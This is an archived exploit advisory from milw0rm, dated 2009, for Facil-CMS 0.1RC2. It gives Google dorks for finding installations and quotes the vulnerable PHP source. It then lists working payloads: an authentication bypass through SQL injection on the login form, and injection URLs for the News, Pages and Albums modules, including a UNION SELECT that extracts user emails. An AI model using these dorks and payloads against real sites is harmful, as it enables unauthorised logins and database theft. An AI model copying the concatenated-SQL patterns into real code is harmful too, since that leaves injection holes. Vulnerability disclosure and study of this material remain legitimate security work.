<html><head><title>Facil-CMS 0.1RC2 Multiple Remote Vulnerabilities</title></head><pre>[Script]
 Facil-CMS 0.1RC2

 +download: http://sourceforge.net/project/platformdownload.php?group_id=217673
 
[DORK]
inurl:modules.php?modload=News
Copyright (C) 2008 by FacilCMS.org
inurl: /facil-cms/

[Author]
any.zicky

[Contact Me]
any__dot__zicky__at__gmail__dot__com ;)

[About]
Facil CMS is a Free and Open Source Project for your site Content Management System (CMS). Facil CMS uses PHP 5 and connect to many database systens. Facil CMS is Easy to create and modify modules for your system and Support Theme Templates.

[Other bug in project]
http://www.milw0rm.com/exploits/5792

[Bugs]
1) we can see phpinfo() in root_path project

+Example: http://localhost/phpinfo.php

2) Auth bypass

let's see login.php code

[CODE]
...

if($_POST['email'] &amp;&amp; $_POST['password'])
 {
  ...
  $email = $_POST['email'];
  $password = md5($_POST['password']);
  $user = new Users();
  $login = $user-&gt;Login($email, $password); &lt;-------------
  if($login &amp;&amp; !is_null($login) &amp;&amp; !empty($login))
  {
  $user = new Users($login);
  ...
[/CODE]

then let look /facil-cms/modules/Users/class/Users.mysql.class.php code

[CODE]
...
function Login($email, $password)
  {
  $sql = &quot;SELECT * FROM &quot; . _USERS_DB_TABLE_ . &quot; WHERE email='&quot; . $email . &quot;' AND password='&quot; . $password . &quot;'&quot;; &lt;----------
  $res = $GLOBALS['DB']-&gt;Execute($sql) or die($GLOBALS['DB']-&gt;ErrorMsg() . '&lt;br /&gt;' . $sql);
  if($res-&gt;RecordCount() == 1)
  {
  return $res-&gt;fields('id');
  }
  }
 ...
  
[/CODE]

+Example: http://locahost/index.php?modload=User

Email: admin@facilcms.org'#
pass: blaaaaa

Email: ' OR 1=1#
pass: blaaaaa

3) SQL-INj in News modules

Let look /facil-cms/modules/News/class/News.mysql.class.php code

[CODE]
...
function getNewInfo($id)
  {
  $sql = &quot;SELECT * FROM &quot; . _NEWS_DB_TABLE_ . &quot; WHERE id=&quot; . $id; &lt;----------------
  $res = $GLOBALS['DB']-&gt;Execute($sql) or die($GLOBALS['DB']-&gt;ErrorMsg() . '&lt;br /&gt;' . $sql);
  if($res-&gt;RecordCount() == 1)
  {
  $this-&gt;setContent($res-&gt;fields('content'));
  $this-&gt;setDate($res-&gt;fields('date'));
  $this-&gt;setId($res-&gt;fields('id'));
  $this-&gt;setLanguage($res-&gt;fields('language'));
  $this-&gt;setPublisher($res-&gt;fields('publisher'));
  $this-&gt;setResume($res-&gt;fields('resume'));
  $this-&gt;setStatus($res-&gt;fields('status'));
  $this-&gt;setTitle($res-&gt;fields('title'));
  return true;
  }
  }
...
[/CODE]

+Example: http://localhost/facil-cms/modules.php?modload=News&amp;op=view&amp;id=1+AND+1=1#

4) SQL-Inj in Pages modules

Let look /facil-cms/modules/Pages/class/Pages.mysql.class.php code
[CODE]
...
function getPageInfo($id)
  {
  $sql = &quot;SELECT * FROM &quot; . _PAGES_DB_TABLE_ . &quot; WHERE id=&quot; . $id; &lt;------------------
  $res = $GLOBALS['DB']-&gt;Execute($sql);
  if($res-&gt;RecordCount() == 1)
  {
  $this-&gt;setActive($res-&gt;fields('active'));
  $this-&gt;setContent($res-&gt;fields('content'));
  $this-&gt;setId($res-&gt;fields('id'));
  $this-&gt;setLanguage($res-&gt;fields('language'));
  $this-&gt;setTitle($res-&gt;fields('title'));
  return true;
  }
  }

...
[/CODE]

+Example: http://localhost/facil-cms/modules.php?modload=Pages&amp;op=view&amp;id=1+ORDER+BY+5/*

5) SQL-inj in ALbums module

Let look /facil-cms/modules/Albums/class/Photos.mysql.class.php code

[CODE]
...
function getPhotoInfo($id)
  {
  $sql = &quot;SELECT * FROM &quot; . _PHOTOS_DB_TABLE_ . &quot; WHERE id=&quot; . $id; &lt;--------------------
  $res = $GLOBALS['DB']-&gt;Execute($sql) or die($GLOBALS['DB']-&gt;ErrorMsg() . '&lt;br /&gt;' . $sql);
  if($res-&gt;RecordCount() == 1)
  {
  $this-&gt;setId($res-&gt;fields('id'));
  $this-&gt;setAlbum($res-&gt;fields('album'));
  $this-&gt;setFile($res-&gt;fields('file'));
  $this-&gt;setComment($res-&gt;fields('comment'));
  return true;
  }
  }
...
[/CODE]

+Example: http://localhost/facil-cms/modules.php?modload=Albums&amp;op=photo&amp;id=-1+UNION+SELECT+1,2,3,email+FROM+facil_users+LIMIT+1,2/*

# milw0rm.com [2009-03-18]</pre></html>